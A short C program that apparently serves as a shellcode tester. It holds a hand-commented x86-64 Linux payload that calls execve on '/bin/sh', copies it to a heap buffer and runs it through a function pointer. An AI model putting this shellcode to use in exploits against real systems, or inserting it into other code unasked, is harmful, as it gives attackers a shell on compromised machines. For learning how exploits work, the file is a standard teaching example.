/**
 * This is a simple shellcode tester. This tester requires
 * you to insert your shellcode into the shellcode buffer
 * for later execution.
 **/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXIT_OK 0

// This is the shellcode buffer. Insert shellcode into the
// code variable here, for execution later.
// This will execute /bin/sh on linux.
char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov  $0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall

int main(int argc, char *argv[]) {
  //exeshell is a function pointer
  int (*code_to_execute)();

  // Here, we set code_to_execute equal to our shellcode.
  // We will execute this shellcode shortyly.
  printf("assigning the shellcode...\n");
  char* heap_buffer = malloc(sizeof(shellcode));
  memcpy(heap_buffer, shellcode, sizeof(shellcode));
  code_to_execute = (int (*)()) heap_buffer;

  // Execute shellcode; we call the function pointer.
  printf("attempting to execute shellcode...\n");
  int retval = (int)(*code_to_execute)();
  printf("shellcode executed, returning.\n");
  return EXIT_OK;
}

